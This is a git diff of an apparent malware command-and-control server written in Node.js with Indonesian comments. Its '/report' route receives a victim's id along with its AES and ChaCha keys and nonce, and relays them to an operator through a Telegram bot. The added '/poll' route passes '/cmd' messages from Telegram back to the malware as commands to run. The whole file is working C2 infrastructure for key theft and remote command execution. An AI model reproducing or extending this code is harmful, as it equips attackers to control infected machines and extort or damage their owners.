@@ -18,15 +18,12 @@ app.get('/', (req, res) => {
 // Route Utama: Menerima Laporan dan Kirim ke Telegram
 app.post('/report', async (req, res) => {
     try {
-        // 1. Ambil data yang dikirim oleh Malware/Cloudflare
-        // Pastikan nama variabel ini SAMA dengan yang dikirim dari Rust (main.rs)
         const { id, aes, chacha, nonce } = req.body;
 
         if (!id || !aes) {
             return res.status(400).json({ status: 'error', message: 'Incomplete data' });
         }
 
-        // 2. Format Pesan untuk Telegram (Markdown)
         const message = `
 🔔 **INCOMING CONNECTION**
 
@@ -36,7 +33,6 @@ app.post('/report', async (req, res) => {
 🎲 Nonce: \`${nonce}\`
         `;
 
-        // 3. Kirim ke API Telegram menggunakan Axios
         const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
         
         await axios.post(telegramUrl, {
@@ -54,7 +50,41 @@ app.post('/report', async (req, res) => {
     }
 });
 
-// Jalankan Server
+// === FITUR BARU: POLLING COMMAND ===
+app.post('/poll', async (req, res) => {
+    try {
+        // 1. Minta update terbaru dari Telegram
+        const tgUrl = `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?offset=-1`;
+        
+        const response = await axios.get(tgUrl);
+        const updates = response.data.result;
+
+        if (updates.length > 0) {
+            const lastMessage = updates[0].message.text;
+            
+            // 2. Cek apakah itu perintah (misal diawali "/cmd")
+            if (lastMessage && lastMessage.startsWith('/cmd ')) {
+                // Ambil perintah aslinya (buang "/cmd " di depan)
+                const command = lastMessage.replace('/cmd ', '');
+                
+                // Kirim perintah ke Malware
+                return res.json({ 
+                    status: "command", 
+                    cmd: command 
+                });
+            }
+        }
+
+        // Kalau tidak ada perintah baru
+        return res.json({ status: "idle" });
+
+    } catch (error) {
+        console.error(error.message);
+        res.json({ status: "error" });
+    }
+});
+
+// Jalankan Server (HANYA SEKALI DI SINI)
 app.listen(PORT, () => {
     console.log(`Server running on port ${PORT}`);
 });
